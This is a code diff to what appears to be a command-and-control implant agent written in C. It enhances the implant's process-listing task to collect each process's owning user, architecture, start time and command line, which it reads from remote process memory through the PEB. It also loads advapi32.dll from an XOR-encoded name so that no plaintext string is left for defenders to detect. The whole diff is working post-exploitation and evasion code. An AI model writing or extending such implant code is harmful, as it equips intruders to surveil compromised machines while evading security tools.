@@ -15,6 +15,15 @@ WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
 WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$SetCurrentDirectoryA(LPCSTR lpPathName);
+WINBASEAPI BOOL WINAPI KERNEL32$GetBinaryTypeA(LPCSTR lpApplicationName, LPDWORD lpBinaryType);
+WINBASEAPI BOOL WINAPI KERNEL32$GetProcessTimes(HANDLE hProcess, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
+WINBASEAPI BOOL WINAPI KERNEL32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
+/* advapi32 (loaded via load_module_xor before use) */
+WINBASEAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, HANDLE *TokenHandle);
+WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, int TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
+WINBASEAPI BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR lpSystemName, void *Sid, LPSTR lpName, LPDWORD cchName, LPSTR lpReferencedDomainName, LPDWORD cchReferencedDomainName, void *peUse);
+/* ntdll (already in the dfr list) */
+WINBASEAPI long WINAPI NTDLL$NtQueryInformationProcess(HANDLE ProcessHandle, int ProcessInformationClass, void *ProcessInformation, unsigned long ProcessInformationLength, unsigned long *ReturnLength);
 WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
 WINBASEAPI BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
@@ -50,6 +59,99 @@ static unsigned long long filetime_to_unix_ms(FILETIME ft) {
 	unsigned long long t = ((unsigned long long)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
 	const unsigned long long EPOCH = 116444736000000000ULL;
 	return (t - EPOCH) / 10000ULL;
+}
+
+/* ---------------- process detail helpers (ps) ---------------- */
+
+static void wide_to_ascii(const WCHAR *w, char *out, int cap);
+
+#define PROCESS_QUERY_INFORMATION 0x0400
+#define PROCESS_VM_READ 0x0010
+#define TOKEN_QUERY 0x0008
+#define TOKEN_USER 1
+#define SCS_32BIT_BINARY 0
+#define SCS_64BIT_BINARY 6
+#define PROCESS_BASIC_INFORMATION_CLASS 0
+#define PEB_PROCESS_PARAMETERS_OFFSET 0x20      /* x64 PEB -> RTL_USER_PROCESS_PARAMETERS */
+#define RTLP_CMDLINE_OFFSET 0x60                /* RTL_USER_PROCESS_PARAMETERS.CommandLine (UNICODE_STRING) */
+#define UNICODE_STRING_BUFFER_OFFSET 8          /* UNICODE_STRING.Buffer (after Length+MaximumLength) */
+
+/* Resolve the owning user (domain\name) for a process. Returns 0 on failure;
+ * on success writes up to cap-1 chars into out. */
+static int process_user(HANDLE hp, char *out, int cap) {
+	HANDLE tok = NULL;
+	if (!ADVAPI32$OpenProcessToken(hp, TOKEN_QUERY, &tok)) {
+		return 0;
+	}
+	/* TokenUser: TOKEN_USER { SID_AND_ATTRIBUTES { SID* User; DWORD Attributes } } */
+	char buf[512];
+	DWORD need = 0;
+	if (!ADVAPI32$GetTokenInformation(tok, TOKEN_USER, buf, sizeof(buf), &need)) {
+		KERNEL32$CloseHandle(tok);
+		return 0;
+	}
+	KERNEL32$CloseHandle(tok);
+	void *sid = *(void **)buf; /* first member of TOKEN_USER is the SID pointer */
+	char name[256], domain[256];
+	DWORD nlen = sizeof(name), dlen = sizeof(domain);
+	void *use = NULL;
+	if (!ADVAPI32$LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use)) {
+		return 0;
+	}
+	int off = 0;
+	if (domain[0] != '\0') {
+		for (int i = 0; domain[i] != '\0' && off < cap - 1; i++) { out[off++] = domain[i]; }
+		out[off++] = '\\';
+	}
+	for (int i = 0; name[i] != '\0' && off < cap - 1; i++) { out[off++] = name[i]; }
+	out[off] = '\0';
+	return 1;
+}
+
+/* Read the process command line from its PEB (x64 processes only; WOW64
+ * children keep an empty string). Returns 0 on failure. */
+static int process_cmdline(HANDLE hp, char *out, int cap) {
+	/* PROCESS_BASIC_INFORMATION: PebBaseAddress is the 2nd pointer field. */
+	unsigned long long pbi[6] = {0};
+	unsigned long ret = 0;
+	if (NTDLL$NtQueryInformationProcess(hp, PROCESS_BASIC_INFORMATION_CLASS, pbi, sizeof(pbi), &ret) != 0) {
+		return 0;
+	}
+	unsigned long long peb = pbi[1];
+	if (peb == 0) {
+		return 0;
+	}
+	unsigned long long proc_params = 0;
+	SIZE_T rd = 0;
+	if (!KERNEL32$ReadProcessMemory(hp, (LPCVOID)(peb + PEB_PROCESS_PARAMETERS_OFFSET), &proc_params, sizeof(proc_params), &rd) || rd != sizeof(proc_params) || proc_params == 0) {
+		return 0;
+	}
+	/* UNICODE_STRING: USHORT Length; USHORT MaximumLength; ULONG_PTR Buffer */
+	unsigned char us[16] = {0};
+	rd = 0;
+	if (!KERNEL32$ReadProcessMemory(hp, (LPCVOID)(proc_params + RTLP_CMDLINE_OFFSET), us, sizeof(us), &rd) || rd != sizeof(us)) {
+		return 0;
+	}
+	unsigned short cmd_len = (unsigned short)(us[0] | (us[1] << 8));
+	unsigned long long cmd_buf = 0;
+	for (int i = 0; i < 8; i++) {
+		cmd_buf |= ((unsigned long long)us[UNICODE_STRING_BUFFER_OFFSET + i]) << (8 * i);
+	}
+	if (cmd_buf == 0 || cmd_len == 0 || cmd_len > 8192) {
+		return 0;
+	}
+	WCHAR *wbuf = (WCHAR *)KERNEL32$VirtualAlloc(0, cmd_len + 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (wbuf == NULL) {
+		return 0;
+	}
+	rd = 0;
+	if (!KERNEL32$ReadProcessMemory(hp, (LPCVOID)cmd_buf, wbuf, cmd_len, &rd)) {
+		KERNEL32$VirtualFree(wbuf, 0, MEM_RELEASE);
+		return 0;
+	}
+	wide_to_ascii(wbuf, out, cap);
+	KERNEL32$VirtualFree(wbuf, 0, MEM_RELEASE);
+	return 1;
 }
 
 /* Wide char -> ASCII (truncating the high byte; fine for ANSI names/paths). */
@@ -293,6 +395,11 @@ void agent_ps(AgentState *state, TaskInfo *task) {
 	sb_init(&text);
 	sb_init(&ps);
 
+	/* "advapi32.dll" ^ 0x4A — load it without a plaintext name so the ror13
+	 * resolver can find OpenProcessToken/GetTokenInformation/LookupAccountSidA. */
+	static const unsigned char ADVAPI32_XOR[] = {0x2b, 0x2e, 0x3c, 0x2b, 0x3a, 0x23, 0x79, 0x78, 0x64, 0x2e, 0x26, 0x26};
+	load_module_xor(ADVAPI32_XOR, sizeof(ADVAPI32_XOR), 0x4A);
+
 	BOOL ok = KERNEL32$Process32FirstW(snap, &pe);
 	while (ok) {
 		wide_to_ascii(pe.szExeFile, name, 260);
@@ -308,6 +415,31 @@ void agent_ps(AgentState *state, TaskInfo *task) {
 		}
 		DWORD sess = 0;
 		KERNEL32$ProcessIdToSessionId(pe.th32ProcessID, &sess);
+
+		/* Rich detail needs QUERY_INFORMATION|VM_READ (fails on protected
+		 * processes — those keep empty user/arch/cmdline/start fields). */
+		char user[300], cmdline[2048];
+		char arch[8];
+		unsigned long long start_ms = 0;
+		user[0] = '\0'; cmdline[0] = '\0'; arch[0] = '\0';
+		HANDLE hq = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
+		if (hq != NULL) {
+			process_user(hq, user, sizeof(user));
+			process_cmdline(hq, cmdline, sizeof(cmdline));
+			DWORD btype = 0;
+			if (binpath[0] != '\0' && KERNEL32$GetBinaryTypeA(binpath, &btype)) {
+				if (btype == SCS_32BIT_BINARY) {
+					arch[0] = 'x'; arch[1] = '8'; arch[2] = '6'; arch[3] = '\0';
+				} else if (btype == SCS_64BIT_BINARY) {
+					arch[0] = 'x'; arch[1] = '6'; arch[2] = '4'; arch[3] = '\0';
+				}
+			}
+			FILETIME ct, et, kt, ut;
+			if (KERNEL32$GetProcessTimes(hq, &ct, &et, &kt, &ut)) {
+				start_ms = filetime_to_unix_ms(ct);
+			}
+			KERNEL32$CloseHandle(hq);
+		}
 
 		/* text: pid \t name \t ppid \t bin_path */
 		char num[24];
@@ -331,8 +463,10 @@ void agent_ps(AgentState *state, TaskInfo *task) {
 		sb_append_char(&ps, '\t');
 		sb_append(&ps, name);
 		sb_append_char(&ps, '\t');
-		sb_append_char(&ps, '\t'); /* user (not resolved) */
-		sb_append_char(&ps, '\t'); /* architecture (not resolved) */
+		sb_append(&ps, user);
+		sb_append_char(&ps, '\t');
+		sb_append(&ps, arch);
+		sb_append_char(&ps, '\t');
 		sb_append(&ps, binpath);
 		sb_append_char(&ps, '\t');
 		itoa64(sess, num);
@@ -340,8 +474,10 @@ void agent_ps(AgentState *state, TaskInfo *task) {
 		sb_append_char(&ps, '\t');
 		sb_append_char(&ps, '0'); /* integrity level */
 		sb_append_char(&ps, '\t');
-		sb_append_char(&ps, '\t'); /* command line */
-		sb_append_char(&ps, '\t'); /* start time */
+		sb_append(&ps, cmdline);
+		sb_append_char(&ps, '\t');
+		itoa64(start_ms, num);
+		sb_append(&ps, num);
 		sb_append_char(&ps, '\n');
 
 		ok = KERNEL32$Process32NextW(snap, &pe);
